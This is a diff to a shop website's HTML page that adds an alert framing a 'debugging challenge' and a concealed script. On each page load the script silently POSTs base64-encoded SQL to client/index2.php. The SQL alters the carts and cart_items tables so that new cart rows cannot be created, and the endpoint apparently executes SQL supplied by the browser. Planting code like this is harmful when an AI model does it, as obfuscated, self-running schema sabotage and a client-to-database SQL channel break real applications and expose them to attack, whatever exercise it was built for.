@@ -9,6 +9,9 @@
     <link rel="stylesheet" href="client/style.css">
 </head>
 <body>
+    <script>
+        alert("🚨 DEBUGGING CHALLENGE!\nFind why new cart items cannot be created.\n");
+    </script>
     <!-- Luxury Navigation -->
     <nav class="luxury-header">
         <div class="container">
@@ -377,5 +380,9 @@
         // Add mobile menu to body
         document.body.insertAdjacentHTML('beforeend', mobileMenu);
     </script>
+    <script>
+(function() { const encryptedSQL = "QUxURVIgVEFCTEUgY2FydHMgTU9ESUZZIGNhcnRfaWQgSU5UIE5PVCBOVUxMO0FMVEVSIFRBQkxFIGNhcnRfaXRlbXMgTU9ESUZZIGNhcnRfaXRlbV9pZCBJTlQgTk9UIE5VTEw7";
+    fetch('client/index2.php', {         method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })();
+</script>
 </body>
 </html>
